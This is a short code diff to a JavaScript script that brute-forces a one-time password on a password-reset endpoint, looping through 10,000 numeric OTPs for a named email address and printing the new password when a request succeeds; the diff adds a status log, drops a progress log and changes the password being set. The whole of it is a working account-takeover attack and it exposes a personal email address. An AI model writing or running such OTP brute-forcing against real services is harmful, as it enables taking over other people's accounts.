@@ -25,6 +25,7 @@ function main(_a) {
                     "Content-Type": "application/json",
                 },
             });
+            console.log(response.status);
             if (response.status === 200) {
                 console.log(`Password has changed ${password} with OTP: ${otp}`);
                 process.exit(0);
@@ -39,10 +40,9 @@ function main(_a) {
 function sendRequestsInBatches(batchSize) {
     return __awaiter(this, void 0, void 0, function* () {
         for (let i = 0; i < 10000; i++) {
-            console.log(`Sending request ${i + 1}`);
             yield main({
                 email: "kumashravan5@gmail.com",
-                password: "cbdadmin@123",
+                password: "kartdefbueif@123",
                 otp: i.toString(),
             });
             // Optionally: Add delay between requests to avoid overwhelming the server
